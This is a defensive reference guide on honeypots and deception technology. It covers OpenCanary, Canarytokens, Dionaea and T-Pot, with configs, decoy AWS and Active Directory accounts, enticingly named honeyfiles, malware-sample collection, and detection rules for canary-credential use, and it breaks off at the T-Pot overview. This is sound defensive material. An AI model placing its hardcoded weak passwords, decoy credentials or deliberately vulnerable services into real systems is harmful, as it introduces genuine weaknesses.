# HONEYPOT & DECEPTION TECHNOLOGY REFERENCE

## Part 1: Deception Technology Fundamentals

### 1.1 Core Definitions

**Honeypot**: A security resource whose value lies in being probed, attacked, or compromised. A honeypot is a decoy system designed to lure attackers away from real assets, observe their techniques, and gather threat intelligence. Unlike production systems, any interaction with a honeypot is inherently suspicious and constitutes an Indicator of Compromise (IOC).

**Honeynet**: A network of honeypots working together to simulate an entire network environment. A honeynet typically includes multiple honeypot systems representing different roles (workstations, servers, databases, printers) connected through a controlled network segment. Honeynets provide broader coverage and enable observation of lateral movement and network-level attacker behaviors.

**Honeytoken**: A digital artifact (credential, file, URL, API key, DNS record) that has no legitimate use but is monitored for access. Unlike honeypots (systems), honeytokens are data objects embedded within real environments. Their unauthorized access triggers an alert indicating compromise of the surrounding system.

**Deception Technology**: An enterprise security category encompassing honeypots, honeytokens, honeyfiles, decoy credentials, fake network segments, and canary traps designed to mislead, detect, and analyze attackers post-breach.

### 1.2 Interaction Levels

**Low-Interaction Honeypots**: Simulate only specific services or protocols. They listen on ports and emulate responses without running actual vulnerable software. Examples: OpenCanary, Honeyd, simple TCP listeners. Pros: low risk, easy to deploy, scalable. Cons: sophisticated attackers may fingerprint and avoid them. Examples of emulated services: SSH banner response, HTTP 200 with fake login page, FTP greeting.

**Medium-Interaction Honeypots**: Provide richer service emulation without full OS exposure. They handle multi-step protocol exchanges, capture credentials, and record session data. Examples: Cowrie (SSH/Telnet), Dionaea (SMB/HTTP). Pros: capture more attacker actions, collect payloads. Cons: higher complexity, some risk if emulation is incomplete.

**High-Interaction Honeypots**: Real operating systems and services, fully functional. Attackers can genuinely exploit vulnerabilities and achieve full compromise. Examples: physical or VM-based systems running unpatched Windows or Linux. Pros: capture complete attacker behavior, zero false negatives on sophistication. Cons: significant containment required, risk of pivoting to production, high maintenance overhead.

**Pure Honeypots**: Full production-like systems with monitoring at the network and system level, not using specific honeypot software. The entire system is the decoy.

### 1.3 Deception Layers

Effective deception operates across multiple network and system layers:

- **Network Layer**: Fake subnets, phantom IPs (Honeyd), BGP black holes, decoy open ports on real servers.
- **Service Layer**: Emulated protocols (SSH, SMB, HTTP, RDP, databases) responding to attacker scans and connection attempts.
- **Application Layer**: Fake web applications (SNARE/Tanner), mock APIs, fake admin panels with credential capture.
- **Data Layer**: Honeyfiles (fake sensitive documents with web bugs), canary tokens embedded in real file shares, fake database entries.
- **Identity Layer**: Decoy AD accounts, fake service accounts with canary credentials, AWS IAM honey keys.
- **Endpoint Layer**: Fake mapped drives, fake registry keys, planted breadcrumbs leading attackers toward monitored traps.

### 1.4 Legal Considerations

**Entrapment Debate**: In most jurisdictions, honeypots are NOT entrapment. Entrapment requires law enforcement inducing someone to commit a crime they would not otherwise commit. Honeypots passively await attack — they do not solicit or induce. However, active redirection of external traffic to honeypots without authorization may raise legal issues.

**Evidence Admissibility**: Logs from honeypots are generally admissible as business records if chain of custody is maintained, collection methods are documented, and logs are stored with integrity verification (hashing). Timestamps should be synchronized via NTP and logged.

**GDPR Considerations**: Honeypots that capture personal data (IP addresses, usernames, email content) must comply with GDPR Article 5 (data minimization), Article 13/14 (transparency), and Article 32 (security of processing). Most legal interpretations hold that data captured from attackers need not be disclosed to the attacker but should be retained only as long as necessary for investigation.

**Authorization Boundaries**: Honeypots should be deployed only within your own network or with explicit written permission. Redirecting external traffic from third-party networks to your honeypot without their consent may violate the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), or equivalent national laws.

**Liability Containment**: Honeypots should be isolated to prevent attackers from using them as stepping stones to attack third parties (which could expose the honeypot operator to liability). Network egress from honeypot segments should be blocked or heavily throttled.

### 1.5 ROI Metrics

**Attacker Dwell Time Reduction**: Honeypots provide near-zero-false-positive alerts, enabling immediate response. Organizations with honeypots report mean time to detect (MTTD) measured in minutes vs. industry average of 197 days (IBM Cost of a Data Breach Report).

**MTTD (Mean Time to Detect)**: The primary KPI for deception technology. Any access to a honeypot = immediate detection event. MTTD for honeypot-detected intrusions is typically under 1 hour vs. months for traditional SIEM-based detection.

**Threat Intelligence Value**: Honeypots capture attacker TTPs (Tactics, Techniques, Procedures), malware samples, C2 infrastructure, exploit payloads, and credential stuffing lists. This intelligence informs defensive hardening across production systems.

**Cost Per Detection**: Honeypots generate zero false positives (any access = IOC). Compared to SIEM rules requiring extensive tuning, honeypots provide extremely low cost-per-true-positive alert.

**Attacker Engagement Time**: High-interaction honeypots waste attacker time. Every hour spent in a honeypot is an hour not spent in production systems.

### 1.6 MITRE ENGAGE Framework

MITRE ENGAGE is a framework for adversary engagement, deception, and denial operations. It complements ATT&CK by describing defensive actions.

**Goals**:
- **Expose**: Reveal adversary presence, tools, and techniques through careful observation of honeypot interactions.
- **Affect**: Impact adversary operations by introducing confusion, wasted resources, or false intelligence.
- **Elicit**: Draw out adversary behaviors, capabilities, and intent through controlled interaction.

**Activity Types**:
- **Honeypot (EAC0002)**: Deploy decoy systems to detect and study adversary activity.
- **Decoy Content (EAC0003)**: Plant fake files, credentials, and data to mislead and track adversaries.
- **Network Diversity (EAC0019)**: Create varied network architectures to confuse adversary mapping.
- **Lures (EAC0004)**: Create artifacts that encourage adversaries to interact with monitored resources.
- **Burn-In (EAC0005)**: Allow adversaries limited access to observe their full toolset before responding.
- **Pocket Litter (EAC0009)**: Add realistic but fake context to decoy environments (fake documents, browser history, saved credentials).
- **Introduced Vulnerabilities (EAC0014)**: Intentionally introduce weaknesses in honeypots to attract exploitation attempts.
- **Safe Harbor (EAC0023)**: Isolate adversary activity to prevent real damage while allowing observation.

**ENGAGE vs ATT&CK Integration**: ENGAGE activities map directly to ATT&CK techniques. For example, deploying an SSH honeypot (EAC0002) detects T1110 (Brute Force), T1021.004 (SSH), and T1078 (Valid Accounts use).

### 1.7 Detection Philosophy

The fundamental advantage of deception technology is the asymmetric detection model: defenders need only one alert (any honeypot access) while attackers must successfully avoid ALL decoys. As decoy density increases, the probability of attacker detection approaches 1.0 even for highly skilled adversaries performing careful reconnaissance.

Rule of thumb: deploy one honeypot per VLAN or network segment, one honeytoken per sensitive file share, one decoy account per Active Directory OU. With this density, even slow and careful attackers will trigger detection during normal lateral movement operations.

### 1.8 Honeypot Categories by Deployment Purpose

**Production Honeypots**: Deployed within an organization's network to detect intruders. Low-interaction, easy to manage. Primary goal: detection and alerting.

**Research Honeypots**: Deployed to gather information about attacker tools and tactics. High-interaction, complex to manage. Primary goal: threat intelligence collection.

**Spam Traps (Spampots)**: Email addresses published in locations only harvesters would find them. Used to identify spam sources and phishing campaigns.

**Database Honeypots**: Fake databases with fake sensitive records. Alert when records are queried or exfiltrated. Useful for detecting SQL injection that reaches data exfiltration phase.

### 1.9 Honeynet Architecture

A complete honeynet deployment includes:

- **Data Control**: Mechanisms to contain attackers within the honeynet (firewall rules, rate limiting on outbound connections).
- **Data Capture**: Collection of all attacker activity (network traffic, system calls, keystrokes).
- **Data Collection**: Centralized, tamper-resistant log aggregation.
- **Data Analysis**: Tools to process and extract intelligence from captured data.

The Honeynet Project (honeynet.org) has published detailed architecture guides since 1999 and maintains open-source honeynet tools and research. Their Gen I/II/III honeynet architectures progressively improved containment while reducing attacker fingerprinting risk.
## Part 2: Thinkst OpenCanary — Open Source Honeypot Framework

### 2.1 Overview

OpenCanary is an open-source, multi-protocol honeypot developed by Thinkst Applied Research (creators of the commercial Canary product). It runs as a daemon on Linux systems and emulates multiple network services simultaneously, alerting on any connection attempt.

**Design Philosophy**: OpenCanary is intentionally simple — it does not try to fully emulate complex protocols but provides enough response to trigger automated scanners, credential brute-forcers, and curious attackers. Every connection to an OpenCanary service is an alert.

### 2.2 Installation

**Prerequisites**: Python 3.6+, pip, Linux (Ubuntu/Debian/CentOS/RHEL recommended)

```bash
# Install system dependencies
sudo apt-get update
sudo apt-get install -y python3-dev python3-pip libssl-dev libffi-dev

# Install OpenCanary
pip install opencanary

# Optional: Samba support (for Windows file share emulation)
sudo apt-get install -y samba
pip install opencanary[snmp]

# Generate default configuration
opencanaryd --copyconfig
# Creates /etc/opencanaryd/opencanary.cfg

# Start the daemon
opencanaryd --start

# Check status
opencanaryd --status

# Stop daemon
opencanaryd --stop
```

**Systemd Service**:
```ini
[Unit]
Description=OpenCanary Honeypot
After=network.target

[Service]
Type=forking
User=root
ExecStart=/usr/local/bin/opencanaryd --start
ExecStop=/usr/local/bin/opencanaryd --stop
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

### 2.3 Configuration File Structure

The configuration file `/etc/opencanaryd/opencanary.cfg` is JSON-formatted:

```json
{
    "device.node_id": "opencanary-node-01",
    "git.enabled": false,
    "ftp.enabled": true,
    "ftp.port": 21,
    "ftp.banner": "FTP server ready",
    "http.enabled": true,
    "http.port": 80,
    "http.banner": "Apache/2.2.22 (Ubuntu)",
    "httpproxy.enabled": false,
    "httpproxy.port": 8080,
    "mssql.enabled": true,
    "mssql.port": 1433,
    "mssql.version": "2012",
    "mysql.enabled": true,
    "mysql.port": 3306,
    "mysql.banner": "5.5.43-0ubuntu0.14.04.1",
    "ntp.enabled": false,
    "ntp.port": 123,
    "redis.enabled": true,
    "redis.port": 6379,
    "sip.enabled": false,
    "sip.port": 5060,
    "smbd.enabled": true,
    "smbd.workgroup": "CONTOSO",
    "snmp.enabled": false,
    "snmp.port": 161,
    "ssh.enabled": true,
    "ssh.port": 22,
    "ssh.version": "SSH-2.0-OpenSSH_5.1p1 Debian-4",
    "telnet.enabled": true,
    "telnet.port": 23,
    "telnet.banner": "",
    "tftp.enabled": false,
    "tftp.port": 69,
    "vnc.enabled": true,
    "vnc.port": 5900,
    "portscan.enabled": true,
    "portscan.ignore_localhost": false,
    "portscan.logtype": 1017,
    "portscan.synrate": 5,
    "portscan.nmaposrate": 5,
    "portscan.lorate": 3
}
```

### 2.4 Service Modules Detail

**FTP (Port 21)**: Emulates FTP server, captures login attempts (username/password), records IP and timestamp. Any credential attempt = alert.

**HTTP (Port 80/443)**: Serves a configurable fake login page. Captures POST credentials, User-Agent strings, and any form submissions. Supports custom HTML templates for realistic impersonation.

**HTTPPROXY (Port 8080)**: Emulates an open HTTP proxy. Attackers attempting to use it for pivoting will trigger alerts.

**MSSQL (Port 1433)**: Emulates Microsoft SQL Server. Captures connection attempts, login credentials, and SQL commands. Especially useful in Windows environments.

**MySQL (Port 3306)**: Emulates MySQL server. Captures authentication attempts. Common target in automated scanning.

**NTP (Port 123 UDP)**: Emulates NTP server. Detects NTP amplification reconnaissance and monlist queries.

**Redis (Port 6379)**: Emulates Redis. Captures connection attempts and commands. Redis is a common target due to frequent misconfigurations with no authentication.

**SIP (Port 5060)**: Emulates Session Initiation Protocol server. Detects VoIP scanning and toll fraud reconnaissance.

**SMBD (Port 445)**: Emulates Windows SMB file share using Samba. Appears as a Windows workstation or server with configurable shares. Critical for detecting lateral movement and ransomware scanning.

**SNMP (Port 161 UDP)**: Emulates SNMP agent. Detects network management reconnaissance and community string brute-forcing.

**SSH (Port 22)**: Emulates OpenSSH server. Captures all authentication attempts (password and key-based). Records session initiation data. Very high volume of hits in internet-facing deployments.

**Telnet (Port 23)**: Emulates Telnet server. Particularly effective for IoT botnets (Mirai variants) that heavily scan for Telnet.

**TFTP (Port 69 UDP)**: Emulates TFTP server. Detects network equipment configuration theft attempts.

**VNC (Port 5900)**: Emulates VNC server. Detects remote desktop reconnaissance and brute-force attempts.

**Portscan Detection**: OpenCanary includes built-in port scan detection. It monitors for SYN packets to closed ports and alerts when scan thresholds are exceeded. Detects Nmap, Masscan, and other common scanners.

### 2.5 Alert Channels

**Email**:
```json
{
    "logger": {
        "class": "PyLogger",
        "kwargs": {
            "formatters": {
                "plain": {"format": "%(message)s"}
            },
            "handlers": {
                "SMTP": {
                    "class": "logging.handlers.SMTPHandler",
                    "mailhost": ["smtp.example.com", 587],
                    "fromaddr": "opencanary@example.com",
                    "toaddrs": ["security@example.com"],
                    "subject": "OpenCanary Alert",
                    "credentials": ["user", "password"]
                }
            }
        }
    }
}
```

**Syslog (for SIEM integration)**:
```json
{
    "handlers": {
        "Syslog": {
            "class": "logging.handlers.SysLogHandler",
            "address": ["siem.example.com", 514],
            "socktype": 2
        }
    }
}
```

**Slack**:
```json
{
    "handlers": {
        "Slack": {
            "class": "opencanary.logger.SlackHandler",
            "webhook_url": "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
        }
    }
}
```

**TCP Socket (for Logstash/Splunk)**:
```json
{
    "handlers": {
        "SocketHandler": {
            "class": "logging.handlers.SocketHandler",
            "host": "logstash.example.com",
            "port": 5000
        }
    }
}
```

### 2.6 Placement Strategy

**Rule**: Deploy one OpenCanary instance per VLAN/network segment. Any alert = immediate P1 incident. No tuning required — zero legitimate traffic should ever reach a honeypot.

**Recommended Deployment Points**:
- Server VLAN: Emulate inactive IP addresses (pick unused IPs from DHCP exclusion range)
- User VLAN: Place among workstation IPs
- DMZ: Emulate additional web servers or database servers
- OT/ICS network: Emulate PLCs or HMI systems (custom banners)
- Cloud VPCs: Deploy in each VPC subnet

**IP Selection**: Use IP addresses that are not assigned to real devices but appear in the same subnet range. This ensures that only active scanners and lateral movers will hit the honeypot (legitimate traffic goes to known hosts).

### 2.7 Docker Deployment

```dockerfile
FROM python:3.9-slim
RUN pip install opencanary
COPY opencanary.cfg /etc/opencanaryd/opencanary.cfg
CMD ["opencanaryd", "--dev"]
```

```yaml
# docker-compose.yml
version: '3'
services:
  opencanary:
    build: .
    network_mode: host
    restart: unless-stopped
    volumes:
      - ./opencanary.cfg:/etc/opencanaryd/opencanary.cfg
      - ./logs:/var/log/opencanary
```

**Note**: `network_mode: host` is required so the container can listen on all configured ports directly on the host network interface. Without host networking, port mapping would limit the honeypot's ability to detect port scans.

### 2.8 OpenCanary Log Format

Each alert is a JSON object written to the log file:
```json
{
    "dst_host": "10.0.0.100",
    "dst_port": 22,
    "local_time": "2024-01-15 14:30:22.123456",
    "logdata": {
        "PASSWORD": "Password1",
        "USERNAME": "admin"
    },
    "logtype": 1001,
    "node_id": "opencanary-node-01",
    "src_host": "192.168.1.50",
    "src_port": 54321,
    "utc_time": "2024-01-15 14:30:22.123456"
}
```

Log type codes indicate service and action:
- 1001: SSH login attempt
- 1002: SSH invalid login
- 1003: FTP login attempt
- 1004: HTTP login attempt
- 1005: HTTP login failed
- 1017: Port scan detected
- 2000: SMB file open
- 2001: VNC login attempt

### 2.9 Thinkst Canary Commercial

The commercial Thinkst Canary product extends OpenCanary with:
- Physical and virtual hardware tokens (Canary devices)
- Cloud-managed console with global correlation
- AWS/Azure/GCP integrations
- Pre-built tokens (Word docs, PDF files, Windows folder notifications)
- Custom token types via API
- Canary management API for programmatic deployment
- SOC integrations (PagerDuty, ServiceNow, Splunk, Sentinel)

Commercial Canaries are deployed as virtual appliances or cloud instances and phone home to the Canary console when triggered. They are widely regarded as best-in-class for enterprise deception deployment due to their reliability and near-zero management overhead. Pricing is per-device (physical Canary token) or per-flock (cloud console) with enterprise volume licensing available.
## Part 3: Canarytokens — Honeytoken Platform

### 3.1 Overview

Canarytokens (canarytokens.org) is a free service by Thinkst that generates honeytoken artifacts. When an attacker accesses a canarytoken, it sends an alert to the token owner. Unlike honeypots (which are network services), canarytokens are embedded within real environments as data artifacts.

**Core Principle**: Plant canary tokens everywhere sensitive data might be accessed. Any alert = attacker has accessed that specific resource.

### 3.2 Token Types

**Web Bug (URL Token)**: A unique URL that sends an alert when loaded. Embed in documents, HTML emails, database fields, or anywhere a URL might be followed. Captures IP address, User-Agent, and referrer of the requester.

**DNS Token**: A unique subdomain that triggers an alert when DNS-resolved. Effective in air-gapped environments where HTTP is blocked but DNS is allowed. Embed in documents as server names, UNC paths, or configuration values.

**Microsoft Word Document**: A .docx file that phones home when opened in Microsoft Word (via template injection or embedded URL). Effective as a honeyfile in file shares. Alert fires when the document is opened, even without macros.

**PDF Token**: A PDF that calls home when opened in Adobe Reader or PDF viewers that execute embedded actions. Similar to Word token but for PDF-heavy environments.

**AWS API Key**: A real but unprivileged AWS IAM key with no actual permissions but with CloudTrail monitoring. Any attempt to use the key (even failed attempts) triggers a CloudTrail event and alert. Extremely effective as a honeytoken for credential theft detection.

**WireGuard VPN Config**: A WireGuard configuration file that triggers an alert when someone attempts to connect using it. Useful for detecting stolen VPN credentials or config files.

**SQL Server Table Token**: A token embedded as a row in a SQL Server table that alerts when queried via a specific tracking mechanism. Detects database exfiltration.

**LDAP Token**: An LDAP query token that fires when an attacker queries Active Directory for a specific attribute or object. Useful for detecting AD enumeration.

**Kubeconfig Token**: A Kubernetes configuration file that alerts when used to authenticate to a cluster. Detects stolen k8s credentials.

**Cloned Website**: A copy of a login page that alerts when visited, useful for detecting phishing infrastructure reuse.

**Custom Image**: An image file that calls home when displayed, embedding a unique web bug.

**Slow Redirect**: A URL that slowly redirects while logging attacker reconnaissance.

### 3.3 Self-Hosted Canarytokens Deployment

For environments that cannot send data to canarytokens.org (air-gapped, classified, or privacy-sensitive):

```bash
# Prerequisites: Docker, Docker Compose
git clone https://github.com/thinkst/canarytokens
cd canarytokens

# Configure environment
cp canarytokens/settings_base.py canarytokens/settings.py
# Edit settings.py:
# DOMAINS = ['tokens.yourdomain.com']
# NXDOMAINS = ['nxdomain.yourdomain.com']
# PUBLIC_IP = 'your.public.ip'
# MAILGUN_API_KEY = 'your-mailgun-key'  # for email alerts
# MAILGUN_DOMAIN = 'mail.yourdomain.com'

# Deploy
docker-compose up -d

# Services started:
# - Frontend (token generation UI) on port 80
# - DNS server on port 53 UDP
# - SMTP server on port 25
# - Redis (token storage)
# - Switchboard (alert routing)
```

**DNS Configuration**: Point a wildcard DNS record for your token domain to the server:
```
*.tokens.yourdomain.com  A  your.public.ip
tokens.yourdomain.com    A  your.public.ip
```

### 3.4 AWS Canary Key with CloudTrail Alerting

```python
import boto3
import json

# Create a canary IAM user with no real permissions
iam = boto3.client('iam')

# Create user
iam.create_user(UserName='canary-svc-account-01')

# Add a deny-all inline policy (so even if keys are used, nothing works)
iam.put_user_policy(
    UserName='canary-svc-account-01',
    PolicyName='DenyAll',
    PolicyDocument=json.dumps({
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Deny", "Action": "*", "Resource": "*"}]
    })
)

# Create access key
response = iam.create_access_key(UserName='canary-svc-account-01')
access_key = response['AccessKey']['AccessKeyId']
secret_key = response['AccessKey']['SecretAccessKey']
print(f"Canary Key ID: {access_key}")
print(f"Canary Secret: {secret_key}")

# CloudTrail EventBridge rule for canary key usage
events = boto3.client('events')
events.put_rule(
    Name='CanaryKeyUsageDetection',
    EventPattern=json.dumps({
        "source": ["aws.iam", "aws.sts"],
        "detail": {
            "userIdentity": {
                "userName": ["canary-svc-account-01"]
            }
        }
    }),
    State='ENABLED',
    Description='Alert on any canary IAM key usage'
)
```

**Embedding Strategy**: Store canary credentials in:
- AWS credentials file on developer workstations
- .env files in code repositories
- Configuration management systems (Ansible vault, Terraform state)
- Documentation in knowledge bases

### 3.5 Active Directory Canary Account

```powershell
# Create canary AD account
New-ADUser -Name "svc-backup-legacy" `
    -SamAccountName "svc-backup-legacy" `
    -UserPrincipalName "svc-backup-legacy@contoso.com" `
    -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) `
    -Enabled $true `
    -PasswordNeverExpires $true `
    -Description "Legacy backup service account - DO NOT USE"

# Add to a group that appears privileged but has no real access
Add-ADGroupMember -Identity "Backup Operators" -Members "svc-backup-legacy"
```

**Microsoft Sentinel Analytics Rule** (KQL):
```kql
SecurityEvent
| where EventID in (4624, 4625, 4648, 4768, 4769)
| where TargetUserName == "svc-backup-legacy"
| project TimeGenerated, EventID, TargetUserName, IpAddress, WorkstationName, LogonType
| extend AlertTitle = "CANARY ACCOUNT ACCESS DETECTED"
```

### 3.6 Canary DNS Records

Plant fake server names in DNS that have no real services:
```
payments-internal.corp.contoso.com  A  10.10.10.250  ; honeypot IP
db-backup-01.corp.contoso.com       A  10.10.10.251  ; honeypot IP
admin-panel.corp.contoso.com        A  10.10.10.252  ; honeypot IP
```

Any DNS resolution of these names is an IOC. Any connection attempt to the IPs triggers the honeypot.

### 3.7 Honeyfiles in Sensitive Directories

Deploy Word or PDF canarytokens as files with enticing names:
- `\\fileserver\Finance\Q4_2024_Acquisitions_CONFIDENTIAL.docx`
- `\\fileserver\HR\Executive_Salaries_2024.xlsx`
- `\\fileserver\IT\Domain_Admin_Passwords_BACKUP.txt`
- `C:\Users\Administrator\Desktop\SSH_Keys_Production.docx`
- `/home/admin/aws_prod_keys_backup.pdf`

**Implementation**: Generate canarytoken-embedded files from canarytokens.org or self-hosted instance. Deploy via Group Policy, Ansible, or manual placement. Any access fires an immediate alert with the source IP and user context.

**File System Monitoring Alternative**: Use inotifywait (Linux) or Windows File Auditing to alert on access to honeyfiles that don't use embedded callbacks:
```bash
# Linux inotify watch
inotifywait -m -e access,open /sensitive/honeyfile.txt |   while read path action file; do
    echo "ALERT: Honeyfile accessed: $path$file ($action)" |     mail -s "Honeyfile Alert" security@example.com
  done
```

### 3.8 Canarytoken Deployment at Scale

For large enterprises deploying hundreds of tokens:

```python
import requests

CANARYTOKEN_SERVER = 'https://canarytokens.org'
# Or self-hosted: 'https://tokens.yourdomain.com'

def create_dns_token(memo, alert_email):
    # Create a DNS canarytoken via the API
    r = requests.post(f'{CANARYTOKEN_SERVER}/generate', data={
        'type': 'dns',
        'memo': memo,
        'email': alert_email
    })
    if r.status_code == 200:
        data = r.json()
        return {
            'token': data['canarytoken'],
            'hostname': data['hostname'],
            'url': data['url']
        }
    return None

def create_word_token(memo, alert_email):
    # Create a Word document canarytoken
    r = requests.post(f'{CANARYTOKEN_SERVER}/generate', data={
        'type': 'doc-msword',
        'memo': memo,
        'email': alert_email
    })
    if r.status_code == 200:
        # Download the generated document
        doc_url = r.json()['doc_url']
        doc_r = requests.get(doc_url)
        return doc_r.content  # Save as .docx file
    return None

# Bulk deployment example
shares = [
    ('Finance Share', '\\\\fileserver\\Finance'),
    ('HR Share', '\\\\fileserver\\HR'),
    ('IT Share', '\\\\fileserver\\IT'),
]

for share_name, share_path in shares:
    token = create_word_token(
        memo=f'Honeyfile in {share_name}',
        alert_email='security@example.com'
    )
    if token:
        filename = f'{share_path}\CONFIDENTIAL_DO_NOT_SHARE.docx'
        with open(filename, 'wb') as f:
            f.write(token)
        print(f'Deployed token to {filename}')
```
## Part 4: Dionaea — Malware Capture Honeypot

### 4.1 Overview

Dionaea is a low-interaction honeypot specifically designed to capture malware samples. It emulates vulnerable services to lure attackers into deploying their malware, which Dionaea then captures for analysis. It is the successor to Nepenthes and is particularly effective at capturing exploits targeting Windows services.

**Primary Purpose**: Capture malware binaries, exploit shellcode, and attack payloads from automated exploit tools and worms.

### 4.2 Supported Protocols

**SMB (Port 445)**: Emulates Windows file sharing, the most important protocol for Dionaea. Captures EternalBlue/MS17-010 exploits, WannaCry, NotPetya, and SMB-propagating worms. Dionaea implements the SMB protocol stack including DCERPC, allowing realistic service emulation.

**HTTP (Port 80)**: Emulates web server. Captures drive-by download attempts, web shells uploaded to fake upload endpoints, and HTTP-based C2 communication attempts.

**FTP (Port 21)**: Emulates FTP server. Captures malware that uses FTP for file transfer or drops malware via FTP.

**MSSQL (Port 1433)**: Emulates SQL Server. Captures SQL injection attempts that lead to xp_cmdshell execution, common in early-stage compromises.

**MySQL (Port 3306)**: Emulates MySQL. Captures authentication attempts and SQL injection payloads.

**SIP (Port 5060)**: Emulates VoIP SIP server. Captures VoIP toll fraud scanning.

**MEMCACHE (Port 11211)**: Emulates Memcached. Captures amplification attack reconnaissance and unauthorized data access attempts.

**UPNP**: Emulates Universal Plug and Play. Captures router/IoT exploitation attempts.

**TFTP**: Emulates TFTP. Common malware delivery mechanism on network devices.

### 4.3 Installation

**Ubuntu/Debian**:
```bash
# Add repository
sudo add-apt-repository ppa:honeynet/nightly
sudo apt-get update

# Install Dionaea
sudo apt-get install -y dionaea

# Alternative: Build from source
sudo apt-get install -y cmake libglib2.0-dev libssl-dev libcurl4-openssl-dev     libreadline-dev libsqlite3-dev python3-dev libtool libudns-dev     libev-dev libpcap-dev

git clone https://github.com/DinoTools/dionaea.git
cd dionaea
mkdir build && cd build
cmake -DCMAKE_INSTALL_PREFIX:PATH=/opt/dionaea ..
make -j4
sudo make install
```

**Docker**:
```bash
docker pull dinotools/dionaea
docker run -d   --name dionaea   -p 21:21 -p 23:23 -p 80:80 -p 443:443   -p 445:445 -p 1433:1433 -p 3306:3306   -v /opt/dionaea/var:/opt/dionaea/var   dinotools/dionaea
```

### 4.4 Configuration

**Main config** `/opt/dionaea/etc/dionaea/dionaea.cfg`:
```ini
[dionaea]
download.dir = /opt/dionaea/var/lib/dionaea/binaries/
listen.addresses = 0.0.0.0
listen.interfaces = eth0

[logging]
default.filename = /opt/dionaea/var/log/dionaea/dionaea.log
default.levels = warning,error
default.domains = *

[processor]
default = filter:accept

[submit]
# Submit to VirusTotal
virustotal.class = dionaea.virustotal
virustotal.apikey = YOUR_VT_API_KEY

[module]
python = python
curl = curl
```

**SMB configuration** `/opt/dionaea/etc/dionaea/services-enabled/smb.yaml`:
```yaml
- name: smb
  config:
    workgroup: WORKGROUP
    server_string: "Windows Server 2008 R2"
    interfaces:
      - name: eth0
        bindport: 445
```

### 4.5 Malware Collection

Captured binaries are stored in:
```
/opt/dionaea/var/lib/dionaea/binaries/
  YYYY-MM-DD/
    {sha256hash}.exe
    {sha256hash}.dll
    {sha256hash}.ps1
```

**Database**: Dionaea stores incident metadata in SQLite:
```
/opt/dionaea/var/lib/dionaea/logsql.sqlite
```

**Query incidents**:
```python
import sqlite3
conn = sqlite3.connect('/opt/dionaea/var/lib/dionaea/logsql.sqlite')
cursor = conn.cursor()
cursor.execute('''
    SELECT
        i.incident_id,
        i.incident_remote_host,
        i.incident_remote_port,
        i.incident_local_port,
        datetime(i.incident_timestamp, 'unixepoch') as timestamp,
        b.download_url,
        b.download_md5_hash
    FROM incidents i
    LEFT JOIN downloads d ON i.incident_id = d.download_id
    LEFT JOIN downloads_offers b ON d.download_id = b.download_id
    ORDER BY i.incident_timestamp DESC
    LIMIT 100
''')
for row in cursor.fetchall():
    print(row)
```

### 4.6 EternalBlue/MS17-010 Capture

Dionaea is particularly effective at capturing EternalBlue exploitation attempts:

```bash
# Monitor for MS17-010 specific activity
tail -f /opt/dionaea/var/log/dionaea/dionaea.log | grep -i "smb"

# Check for shellcode captures
ls -lh /opt/dionaea/var/lib/dionaea/binaries/$(date +%Y-%m-%d)/
```

**EternalBlue indicators in logs**:
- Trans2 secondary requests (EternalBlue fingerprint)
- DCERPC bind requests to specific UUIDs
- Shellcode patterns in SMB payload buffers

### 4.7 SIEM Integration

**Filebeat configuration** for log shipping:
```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /opt/dionaea/var/log/dionaea/*.log
  fields:
    source: dionaea
    honeypot_type: dionaea

output.elasticsearch:
  hosts: ["elasticsearch:9200"]
  index: "honeypot-dionaea-%{+yyyy.MM.dd}"
```

**Logstash filter** for Dionaea log parsing:
```ruby
filter {
  if [fields][source] == "dionaea" {
    grok {
      match => { "message" => "%{TIMESTAMP_ISO8601:timestamp} %{LOGLEVEL:level} %{GREEDYDATA:detail}" }
    }
    mutate {
      add_tag => ["honeypot", "dionaea"]
      add_field => { "alert_priority" => "P1" }
    }
  }
}
```

### 4.8 Malware Sample Submission

**VirusTotal Submission**:
```python
import requests
import hashlib
import os

VT_API_KEY = 'your_virustotal_api_key'

def submit_to_virustotal(filepath):
    with open(filepath, 'rb') as f:
        content = f.read()

    sha256 = hashlib.sha256(content).hexdigest()

    # Check if already known
    check_url = f'https://www.virustotal.com/api/v3/files/{sha256}'
    headers = {'x-apikey': VT_API_KEY}
    r = requests.get(check_url, headers=headers)

    if r.status_code == 200:
        result = r.json()
        stats = result['data']['attributes']['last_analysis_stats']
        print(f"Known sample: {sha256} - Malicious: {stats['malicious']}")
        return

    # Submit new sample
    files = {'file': (os.path.basename(filepath), content)}
    r = requests.post('https://www.virustotal.com/api/v3/files',
                      headers=headers, files=files)
    if r.status_code == 200:
        analysis_id = r.json()['data']['id']
        print(f"Submitted: {sha256} - Analysis ID: {analysis_id}")

# Process all new captures
import glob
for binary in glob.glob('/opt/dionaea/var/lib/dionaea/binaries/**/*.exe', recursive=True):
    submit_to_virustotal(binary)
```

**MalwareBazaar Submission**:
```python
def submit_to_malwarebazaar(filepath):
    with open(filepath, 'rb') as f:
        content = f.read()

    files = {'file': (os.path.basename(filepath), content, 'application/octet-stream')}
    data = {
        'tags': 'honeypot,dionaea,automated',
        'delivery_method': 'other',
        'comment': 'Captured by Dionaea honeypot'
    }
    headers = {'API-KEY': 'your_malwarebazaar_api_key'}

    r = requests.post('https://mb-api.abuse.ch/api/v1/',
                      headers=headers, files=files, data=data)
    print(f"MalwareBazaar: {r.json()['query_status']}")
```

### 4.9 Dionaea Incident Types

Dionaea classifies captures into incident types:
- **loginattempt**: Authentication attempt (with credentials)
- **download**: Successful malware download captured
- **reject**: Connection rejected after protocol exchange
- **scan**: Port scan detected
- **blackhole**: Connection to non-listening service

Each incident is stored in the SQLite database with source IP, destination port, timestamp, and protocol-specific data such as captured credentials or downloaded binary hash.
## Part 5: T-Pot and Cowrie

### 5.1 T-Pot Overview

T-Pot is the all-in-one, multi-honeypot platform developed by Deutsche Telekom Security. It packages 20+ honeypots in a Docker Compose environment with full ELK stack integration, providing a comprehensive honeypot deployment with built-in visualization.

**Key Features**:
- 20+ honeypots running simultaneously
- Elasticsearch + Logstash + Kibana for log analysis
- Pre-built Kibana dashboards for each honeypot type
- Community threat feed contribution
- Suricata IDS running alongside honeypots
- P0f OS fingerprinting
- Spiderfoot OSINT integration
- Attack map visualization

